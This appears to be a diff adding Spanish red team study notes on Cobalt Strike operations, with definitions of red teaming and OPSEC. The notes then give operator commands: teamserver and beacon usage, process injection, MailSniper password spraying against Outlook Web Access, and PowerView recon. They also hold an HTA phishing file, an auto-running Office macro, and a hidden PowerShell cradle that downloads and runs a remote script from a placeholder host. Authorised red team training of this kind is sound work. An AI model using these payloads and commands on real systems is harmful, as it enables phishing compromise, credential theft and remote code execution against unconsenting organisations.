@@ -1,3 +1,112 @@
+#¿Qué es un RED TEAM?
+Red Teaming es el proceso de usar tácticas, técnicas y procedimientos (TTP) para emular una amenaza del mundo real, con el objetivo de medir 
+la efectividad de las personas, los procesos y las tecnologías utilizadas para defender un medio ambiente.
+No se puede subestimar lo importante que es planificar adecuadamente 
+el compromiso del equipo rojo, no solo para lograr buenos resultados, sino para garantizar que todos los involucrados estén protegidos
+
+#¿Qué es OPSEC?
+Es un término acuñado originalmente por el ejército de los EE. UU. Y adoptado por la comunidad de seguridad de la información.
+Generalmente se usa para describir la "facilidad" con la que las acciones pueden ser observadas por la inteligencia del "enemigo".
+
+#Engagement - Reglas
+Definir los objetivos del compromiso.
+Defina el (los) objetivo (s) del compromiso, incluidos los dominios y los rangos de IP.
+Identifique los requisitos y / o restricciones legales o reglamentarios.
+Contiene listas de contactos de emergencia para personas clave en todas las partes.
+
+#CobalStrike
+./teamserver ip Password
+bash init.sh
+
+#OPSEC-1
+OPSEC : Team Server permite que varios clientes se conecten al mismo tiempo.
+No exponer el puerto 50050 directamente a Internet. 
+En su lugar, se debe utilizar una solución segura de acceso remoto (como un túnel VPN o SSH).
+
+#Listener Management
+New Listener
+HTTP
+SMB
+TCP
+
+#Payload
+Attack Packages WindowsExecutables(S)
+X64
+Save
+
+#OPSEC-2
+Las cargas útiles por etapas son buenas si su método de entrega limita la cantidad de datos que puede enviar.
+Sin embargo, tienden a tener más indicadores en comparación con los sin etapas. Si tienes la opción, ve sin escenario.
+
+#Interacting with Beacon
+Intercart
+help
+help argue
+sleep 10
+
+#OPSEC-3
+OPSEC : Los tiempos de check-in rápidos pueden aumentar la posibilidad de que se detecte el tráfico de la baliza. 
+También puede agregar un jitter para aleatorizar el tiempo de registro en un porcentaje determinado.
+
+inject 1234 x64 http-80
+
+#DNS RECORDS
+dig dominio +short
+whois ip
+dnscan
+spoofcheck
+
+#SocialMeida
+site:"linkedin.com" empresa
+
+#PasswordSpraying
+MailSniper.ps1 Office 365
+Invoke-DomainHarvestOWA -ExchHostname ip
+namemash.py 
+Invoke-UsernameHarvestOWA -ExchHostname ip -Domain Netbios -UserList .\possible-usernames.txt -OutFile valid.txt
+Invoke-PasswordSprayOWA -ExchHostname ip -UserList .\valid.txt -Password Summer2021
+Get-GlobalAddressList -ExchHostname IP -UserName netbios\iyates -Password Summer2021 -OutFile gal.txt
+
+#OPSEC-4
+En el mundo real, tenga en cuenta que estos intentos de autenticación pueden contar para la política de bloqueo de dominio para los usuarios. 
+Demasiados intentos en un corto espacio de tiempo no solo son ruidosos, sino que también pueden bloquear las cuentas.
+
+#HTA
+<html>
+  <head>
+    <title>Hello World</title>
+  </head>
+  <body>
+    <h2>Hello World</h2>
+    <p>This is an HTA...</p>
+  </body>
+
+  <script language="VBScript">
+    Function Pwn()
+      Set shell = CreateObject("wscript.Shell")
+      shell.run "calc"
+    End Function
+
+    Pwn
+  </script>
+</html>
+------------------------------------
+Cobal-Attack-Webdrive-by-Scripted Web Delivery (s)
+copi to calc
+shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://ip/h'))"""
+------------------------------------
+#MACRO
+Sub AutoOpen()
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  Shell.Run "calc"
+End Sub
+
+#Phish de HTA
+Atacck-Web-drive by -FileHost
+
+
+
 #POWERVIEW
 powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
 powershell Get-Domain
